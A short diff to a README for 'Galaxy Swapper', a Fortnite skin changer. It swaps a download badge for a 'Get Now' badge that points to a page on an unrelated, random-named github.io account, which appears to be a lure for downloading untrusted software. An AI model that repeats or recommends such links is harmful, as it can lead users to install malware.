@@ -5,12 +5,7 @@
 
 <h1 align="center">✨ Galaxy Swapper – Fortnite Skin Changer</h1>
 
-<p align="center">
-  <a href="https://fortnite-galaxy-swapper.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20Galaxy%20Swapper-Free%20Fortnite%20Tool-8000FF?style=for-the-badge&logo=epicgames&logoColor=white" 
-         alt="Download Galaxy Swapper" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://archerportillocdzc.github.io/.github/fortnite-galaxy-swapper)
 
 <!-- Tool Preview -->
 <p align="center">
